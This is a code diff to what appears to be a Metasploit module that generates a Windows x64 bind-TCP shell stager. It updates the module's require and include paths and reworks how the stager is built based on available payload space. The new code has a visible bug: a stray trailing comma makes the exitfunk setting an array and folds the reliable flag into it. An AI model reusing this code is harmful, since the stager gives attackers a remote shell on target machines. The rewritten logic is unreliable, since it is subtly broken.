@@ -1,7 +1,7 @@
 # -*- coding: binary -*-
 
 require 'msf/core'
-require 'msf/core/transport_config'
+require 'msf/core/payload/transport_config'
 require 'msf/core/payload/windows/x64/block_api'
 require 'msf/core/payload/windows/x64/exitfunk'
 
@@ -15,7 +15,7 @@ module Msf
 
 module Payload::Windows::BindTcp_x64
 
-  include Msf::TransportConfig
+  include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
   include Msf::Payload::Windows::BlockApi_x64
   include Msf::Payload::Windows::Exitfunk_x64
@@ -24,19 +24,16 @@ module Payload::Windows::BindTcp_x64
   # Generate the first stage
   #
   def generate
-    # Generate the simple version of this stager if we don't have enough space
-    if self.available_space.nil? || required_space > self.available_space
-      return generate_bind_tcp({
-        :port => datastore['LPORT'],
-        :reliable => false
-      })
-    end
-
     conf = {
-      :port     => datastore['LPORT'],
-      :exitfunk => datastore['EXITFUNC'],
-      :reliable => true
+      port:     datastore['LPORT'],
+      reliable: false
     }
+
+    # Generate the more advanced stager if we have the space
+    unless self.available_space.nil? || required_space > self.available_space
+      conf[:exitfunk] = datastore['EXITFUNC'],
+      conf[:reliable] = true
+    end
 
     generate_bind_tcp(conf)
   end
